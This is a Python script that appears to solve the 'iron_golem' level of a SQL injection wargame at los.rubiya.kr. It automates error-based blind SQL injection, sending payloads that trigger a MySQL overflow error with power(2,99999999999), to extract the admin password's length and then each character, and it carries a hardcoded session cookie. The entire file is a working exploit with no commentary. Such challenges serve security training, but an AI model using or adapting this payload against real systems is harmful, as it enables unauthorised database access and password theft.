import urllib.request

from urllib.parse import quote



result = ""

pwlen = 0



for i in range(1, 50):

    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw="

    data = "' or id='admin' and if((length(pw)='{}'),power(2,99999999999),0) -- ;".format(str(i))

    print(data)

    data = quote(data)

    re = urllib.request.Request(url + data)

    re.add_header("User-agent", "Mozilla/5.0")

    re.add_header("Cookie", "PHPSESSID=2jmdje149iheon8es94327lllt")

    res = urllib.request.urlopen(re)



    if str(res.read()).find("DOUBLE value is out of range in") != -1:

        pwlen = i

        print("Password Length is {} !!".format(pwlen))

        break



for i in range(1, pwlen + 1):

    for j in range(32, 128):

        url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw="

        data = "' or id='admin' and if((substr(pw,{},1)='{}'),power(2,99999999999),0) -- ;".format(str(i), chr(j))

        print(data)

        data = quote(data)

        re = urllib.request.Request(url + data)

        re.add_header("User-agent", "Mozilla/5.0")

        re.add_header("Cookie", "PHPSESSID=2jmdje149iheon8es94327lllt")

        res = urllib.request.urlopen(re)



        if str(res.read()).find("DOUBLE value is out of range in") != -1:

            result += chr(j).lower().replace(" ","")



            print("Found it! [{}]".format(result))

            break



print("Password is [{}]".format(result))
